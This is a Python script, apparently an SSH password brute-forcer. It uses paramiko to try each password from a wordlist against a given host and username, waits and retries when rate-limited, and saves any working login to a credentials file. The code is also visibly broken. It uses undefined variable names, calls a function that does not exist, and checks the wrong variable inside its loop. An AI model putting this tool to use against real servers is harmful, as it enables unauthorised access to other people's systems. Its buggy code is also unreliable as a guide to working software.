import paramiko
import socket
import time
from colorama import Fore, Back, Style

def is_open(host, user, password):

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(hostname=host, username=user, password=password, timeout=3)
    except socket.timeout:
        # Unreachable host
        print(f"[{Fore.RED}!{Style.RESET_ALL}] {Fore.YELLOW}{hostname}{Style.RESET_ALL} {Fore.RED}is unreachable.{Style.RESET_ALL}")
        return False
    except paramiko.AuthenticationException:
        print(f"[{Fore.RED}!{Style.RESET_ALL}] {Fore.RED}Incorrect credentials for{Style.RESET_ALL} {Fore.YELLOW}{username}:{password}{Style.RESET_ALL}")
        return False
    except paramiko.SSHException:
        print(f"[{Fore.YELLOW}?{Style.RESET_ALL}] {Fore.YELLOW}Quota exceeded, retrying with one minute delay...{Style.RESET_ALL}")
        # Sleep for 60 seconds
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # Connection established 
        print(f"[{Fore.GREEN}+{Style.RESET_ALL}] {Fore.GREEN}Found combo.{Style.RESET_ALL}\n\tHost: {Fore.GREEN}{hostname}{Style.RESET_ALL}\n\tUsername: {Fore.GREEN}{username}{Style.RESET_ALL}\n\tpassword: {Fore.GREEN}{password}{Style.RESET_ALL}")
        return True

def bruteforce(host, user, wordlist):
    try:
        pwd_list = open(wordlist).read().splitlines()
    except Exception as e:
        print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')
    else:
        for pwd in pwd_list:
            if is_open(host, user, password):
                open(f'credentials-ssh{host}.txt', 'w').write(f'{user}@{host}:{password}')